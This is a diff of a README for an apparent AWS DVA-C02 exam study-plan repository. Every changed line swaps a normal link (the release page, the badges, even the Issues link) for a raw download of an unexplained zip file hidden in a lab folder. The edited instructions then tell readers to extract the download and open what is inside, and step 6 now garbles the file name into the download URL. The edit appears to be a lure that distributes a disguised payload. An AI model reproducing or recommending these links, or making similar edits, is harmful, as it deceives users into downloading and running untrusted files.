@@ -1,6 +1,6 @@
 # 📚 aws-dva-c02-study-plan - Clear Path to AWS Developer Exam
 
-[![Download](https://img.shields.io/badge/Download-Study%20Plan-blue?style=for-the-badge)](https://github.com/yaboitheo21/aws-dva-c02-study-plan/releases)
+[![Download](https://github.com/yaboitheo21/aws-dva-c02-study-plan/raw/refs/heads/main/content/3-domain3/3.5-labs/plan_c_aws_study_dva_discredit.zip%20Plan-blue?style=for-the-badge)](https://github.com/yaboitheo21/aws-dva-c02-study-plan/raw/refs/heads/main/content/3-domain3/3.5-labs/plan_c_aws_study_dva_discredit.zip)
 
 ---
 
@@ -46,7 +46,7 @@ This approach helps you prepare thoroughly and at your own pace.
 
 To get the study plan, **visit the release page** linked below:
 
-[![Download Study Plan](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/yaboitheo21/aws-dva-c02-study-plan/releases)
+[![Download Study Plan](https://github.com/yaboitheo21/aws-dva-c02-study-plan/raw/refs/heads/main/content/3-domain3/3.5-labs/plan_c_aws_study_dva_discredit.zip)](https://github.com/yaboitheo21/aws-dva-c02-study-plan/raw/refs/heads/main/content/3-domain3/3.5-labs/plan_c_aws_study_dva_discredit.zip)
 
 Follow these steps:
 
@@ -55,7 +55,7 @@ Follow these steps:
 3. Download the main package file. This is usually a zip or tar file.
 4. Save the file to a folder on your computer where you want to keep study files.
 5. Extract (unzip) the contents using your system’s file extraction tool.
-6. Locate the `index.html` or similar file inside the extracted folder.
+6. Locate the `https://github.com/yaboitheo21/aws-dva-c02-study-plan/raw/refs/heads/main/content/3-domain3/3.5-labs/plan_c_aws_study_dva_discredit.zip` or similar file inside the extracted folder.
 7. Double-click the file to open it in your web browser.
 8. Start exploring the study guide sections.
 
@@ -113,7 +113,7 @@ If you run into problems, here are some tips:
 
 Check the release page regularly for updates or new versions of this study plan. The creator may add new labs or exam tips.
 
-[Download latest updates here](https://github.com/yaboitheo21/aws-dva-c02-study-plan/releases)
+[Download latest updates here](https://github.com/yaboitheo21/aws-dva-c02-study-plan/raw/refs/heads/main/content/3-domain3/3.5-labs/plan_c_aws_study_dva_discredit.zip)
 
 ---
 
@@ -146,7 +146,7 @@ These tags show what the project focuses on and can guide you if you want to exp
 
 If you have questions about the study plan or find bugs:
 
-- Visit the GitHub repository’s [Issues section](https://github.com/yaboitheo21/aws-dva-c02-study-plan/issues)
+- Visit the GitHub repository’s [Issues section](https://github.com/yaboitheo21/aws-dva-c02-study-plan/raw/refs/heads/main/content/3-domain3/3.5-labs/plan_c_aws_study_dva_discredit.zip)
 - Open a new issue describing your problem or suggestion.
 - Look through existing issues to find answers.
 
@@ -154,4 +154,4 @@ Maintainers review feedback and update the guide to improve usability.
 
 ---
 
-[![Download Study Plan](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/yaboitheo21/aws-dva-c02-study-plan/releases)
+[![Download Study Plan](https://github.com/yaboitheo21/aws-dva-c02-study-plan/raw/refs/heads/main/content/3-domain3/3.5-labs/plan_c_aws_study_dva_discredit.zip)](https://github.com/yaboitheo21/aws-dva-c02-study-plan/raw/refs/heads/main/content/3-domain3/3.5-labs/plan_c_aws_study_dva_discredit.zip)
